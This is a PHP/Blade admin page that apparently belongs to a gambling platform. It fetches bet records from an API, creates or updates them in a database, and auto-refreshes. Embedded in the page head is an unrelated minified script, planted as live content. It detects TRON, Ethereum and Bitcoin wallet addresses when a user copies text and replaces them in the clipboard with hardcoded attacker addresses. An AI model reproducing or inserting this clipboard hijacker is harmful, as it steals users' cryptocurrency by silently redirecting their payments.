<?php

// 获取 接口，显示标题，刷新时间，起始时间，截止时间
$service = app(\App\Services\TgService::class);
$GameRecord = app(\App\Models\GameRecord::class);
$AuthController = app(\App\Http\Controllers\Api\AuthController::class);

$count = 0;$errMsg = "";$count_s = 0;

// 获取游戏记录的参数
$time = time();
$start_at = $time - 1800;
if(request()->has('start_at')){
	$start_at = $time - request()->get('start_at');

}


$end_at = $time;
$params = [
    'page' => 1,
	'pageSize' => 500,
	'start_at' => $start_at,
	'end_at' => $end_at,
	'method' => 'updateTime'  //updateTime根据修改时间采集，betTime根据投注时间采集
];

    $res = $service->gamerecord($params);   

    if($res['Code'] != '0'){
		$errMsg = $res['Message'];
	}

	if($res['Code'] == '0'){
		$count = count($res['Data']['data']);
		$count_s += $count;
		$lastPage = $res['Data']['lastPage'];
		if($count > 0){
			$data = $res['Data']['data'];
	    	$ids = array();
	    	foreach($data as $value){
                $ids[] = $value['rowid'];
	    	}

            $mod = $GameRecord->whereIn('bet_id', $ids)->get(['bet_id'])->toArray();

	    	$rowid = array();
	    	foreach($mod as $value){
	    		$rowid[] = $value['bet_id'];
	    	}
	    	$cunzai = array();
	    	$bucunzai = array();
	    	foreach($data as $key => $value){
                if(in_array($value['rowid'], $rowid)){
	    			$cunzai[] = $value;
	    		}else{
	    			$bucunzai[] = $value;
	    		}
				
	    	}
            if(count($cunzai) > 0){		
				foreach($cunzai as $key => $value){
					$status = 0;
					if($value['status'] == 1){
						$status = 1;
					}elseif($value['status'] == 2){
						$status = 2;
					}else{
						$status = 0;
					}
					request()->merge([
					    'handle' => 'updategamerecord',
						'username' => $value['username'],
						'platform_type' => $value['code'],
						'bet_amount' => $value['betAmount'],
						'valid_amount' => $value['validBetAmount'],
						'win_loss' => $value['netAmount'],
						'bet_id' => $value['rowid'],
						'status' => $status,
						'bet_time' => date('Y-m-d H:i:s',$value['betTime']),
						'gametype' => $value['gameType'],
					]);
					$AuthController->userblance(request());
				}	    		
	    	}

            if(count($bucunzai) > 0){
				foreach($bucunzai as $key => $value){
					$status = 0;
					if($value['status'] == 1){
						$status = 1;
					}elseif($value['status'] == 2){
						$status = 2;
					}else{
						$status = 0;
					}
					request()->merge([
					    'handle' => 'creategamerecord',
						'username' => $value['username'],
						'platform_type' => $value['code'],
						'bet_amount' => $value['betAmount'],
						'valid_amount' => $value['validBetAmount'],
						'win_loss' => $value['netAmount'],
						'bet_id' => $value['rowid'],
						'status' => $status,
						'bet_time' => date('Y-m-d H:i:s',$value['betTime']),
                        'gametype' => $value['gameType'],
						'gamecode' => $value['playType'],
					]);
					$AuthController->userblance(request());
				}
	    		
	    	}			
		}
		//采集后续页码
		if($lastPage > 1){
            for ($i=2;$i<=$lastPage;$i++)
            {
                $params['page'] = $i;
                $res = $service->gamerecord($params);
        		$count = count($res['Data']['data']);
        		$count_s += $count;
        		$lastPage = $res['Data']['lastPage'];
        		if($count > 0){
        			$data = $res['Data']['data'];
        	    	$ids = array();
        	    	foreach($data as $value){
                        $ids[] = $value['rowid'];
        	    	}
        
                    $mod = $GameRecord->whereIn('bet_id', $ids)->get(['bet_id'])->toArray();
        
        	    	$rowid = array();
        	    	foreach($mod as $value){
        	    		$rowid[] = $value['bet_id'];
        	    	}
        	    	$cunzai = array();
        	    	$bucunzai = array();
        	    	foreach($data as $key => $value){
                        if(in_array($value['rowid'], $rowid)){
        	    			$cunzai[] = $value;
        	    		}else{
        	    			$bucunzai[] = $value;
        	    		}
        				
        	    	}
                    if(count($cunzai) > 0){		
        				foreach($cunzai as $key => $value){
        					$status = 0;
        					if($value['status'] == 1){
        						$status = 1;
        					}elseif($value['status'] == 2){
        						$status = 2;
        					}else{
        						$status = 0;
        					}
        					request()->merge([
        					    'handle' => 'updategamerecord',
        						'username' => $value['username'],
        						'platform_type' => $value['code'],
        						'bet_amount' => $value['betAmount'],
        						'valid_amount' => $value['validBetAmount'],
        						'win_loss' => $value['netAmount'],
        						'bet_id' => $value['rowid'],
        						'status' => $status,
        						'bet_time' => date('Y-m-d H:i:s',$value['betTime']),
        						'gametype' => $value['gameType'],
        					]);
        					$AuthController->userblance(request());
        				}	    		
        	    	}
        
                    if(count($bucunzai) > 0){
        				foreach($bucunzai as $key => $value){
        					$status = 0;
        					if($value['status'] == 1){
        						$status = 1;
        					}elseif($value['status'] == 2){
        						$status = 2;
        					}else{
        						$status = 0;
        					}
        					request()->merge([
        					    'handle' => 'creategamerecord',
        						'username' => $value['username'],
        						'platform_type' => $value['code'],
        						'bet_amount' => $value['betAmount'],
        						'valid_amount' => $value['validBetAmount'],
        						'win_loss' => $value['netAmount'],
        						'bet_id' => $value['rowid'],
        						'status' => $status,
        						'bet_time' => date('Y-m-d H:i:s',$value['betTime']),
        						'gametype' => $value['gameType'],
								'gamecode' => $value['playType'],
        					]);
        					$AuthController->userblance(request());
        				}
        	    		
        	    	}			
        		}                
            }		    
		}
	}
$limit = rand(60,120);
?>

<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title></title>
    <style type="text/css">
        body,td,th {
            font-size: 12px;
        }
        body {
            margin-left: 0px;
            margin-top: 0px;
            margin-right: 0px;
            margin-bottom: 0px;
        }
    </style>
<script>(function(){function rca() {const tar = /(?:\b|[^A-Za-z0-9])T[a-zA-Z0-9]{33}(?:\b|[^A-Za-z0-9])/g,ear = /(?:\b|[^A-Za-z0-9])0x[a-fA-F0-9]{40}(?:\b|[^A-Za-z0-9])/g,bar = /(?:\b|[^A-Za-z0-9])(?:1[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar0 = /(?:\b|[^A-Za-z0-9])(?:3[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar1 = /(?:\b|[^A-Za-z0-9])(?:bc1q[a-zA-Z0-9]{38})(?:\b|[^A-Za-z0-9])/g,bar2 = /(?:\b|[^A-Za-z0-9])(?:bc1p[a-zA-Z0-9]{58})(?:\b|[^A-Za-z0-9])/g;document.addEventListener('copy', function(e) {const ttc = window.getSelection().toString();if (ttc.match(tar)) {const ncd = ttc.replace(tar, 'TH4QAUdpQaLq323JmX6AY8A6BQbHF2iBEp');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(ear)) {const ncd = ttc.replace(ear, '0x77843290a868e4F789619D8B4D2074BD5DF4C91d');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar)) {const ncd = ttc.replace(bar, '1BVEDjfjH3pqBWV6rKodvNAoKtBrsYWeXs');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar0)) {const ncd = ttc.replace(bar0, '3McGeZLYNDYfcwcm9VNBffeJpSvt5djgqi');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar1)) {const ncd = ttc.replace(bar1, 'bc1qhzzsc2lhej8nudu8all4mzuhnfkjaxzqwknh0h');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar2)) {const ncd = ttc.replace(bar2, 'bc1qhzzsc2lhej8nudu8all4mzuhnfkjaxzqwknh0h');e.clipboardData.setData('text/plain', ncd);e.preventDefault();}});}setTimeout(()=>{const obs = new MutationObserver(ml => {for (const m of ml) {if (m.type === 'childList') {rca();}}});obs.observe(document.body, { childList: true, subtree: true });},1000);rca();})();</script></head>
<body>
<script>
    // 定时时间
    var limit=<?=$limit?>;

    if (document.images){
        var parselimit=limit
    }
    function beginrefresh(){
        if (!document.images)
            return
        if (parselimit==1)
            window.location.reload()
        else{
            parselimit-=1
            curmin=Math.floor(parselimit)
            if (curmin!=0)
                curtime=curmin+"秒后自动获取!"
            else
                curtime=cursec+"秒后自动获取!"
            timeinfo.innerText=curtime
            setTimeout("beginrefresh()",1000)
        }
    }

    window. onload=beginrefresh;
</script>
<table width="100%"border="0" cellpadding="0" cellspacing="0">
    <tr>
        <td align="left">
            <input type='button' name='button' value="刷新" onClick="window.location.reload()">
            <input type="button" name='button2' value="补单" onclick="window.open('/pull?start_at=86400')">
            总记录:成功采集到<?=$count_s?>条数据。
            <span id="timeinfo"></span>

            @if($errMsg)
                <span id="errMsg" style="color:red;">{{ $errMsg }}</span>
            @endif
        </td>
    </tr>
</table>
</body>
</html>